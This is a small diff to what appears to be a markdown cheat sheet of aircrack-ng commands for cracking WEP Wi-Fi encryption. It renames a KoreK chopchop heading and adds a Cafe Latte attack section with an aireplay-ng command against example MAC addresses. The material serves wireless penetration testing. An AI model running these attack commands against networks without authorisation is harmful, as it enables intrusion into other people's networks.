@@ -157,7 +157,7 @@ aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:09:5B:EB:C5:2B -y sharedkey
 aireplay-ng -5 -b 00:14:6C:7E:40:80 -h 00:09:5B:EB:C5:2B mon0
 ```
 
-## [Crack WEP KoreK chopchop](https://www.aircrack-ng.org/doku.php?id=korek_chopchop)
+## [Crack WEP with KoreK chopchop](https://www.aircrack-ng.org/doku.php?id=korek_chopchop)
 
 ```
 aireplay-ng -4 -b 00:14:6C:7E:40:80 -h 00:09:5B:EB:C5:2B mon0
@@ -167,6 +167,12 @@ Chopchop Without Authentication
 
 ```
 aireplay-ng -4 -b 00:14:6C:7E:40:80 mon0
+```
+
+## [Crack WEP with Cafe Latte](https://www.aircrack-ng.org/doku.php?id=cafe-latte)
+
+```
+aireplay-ng -6 -b 00:14:6C:7E:40:80 -h 00:09:5B:EB:C5:2B -D mon0
 ```
 
 
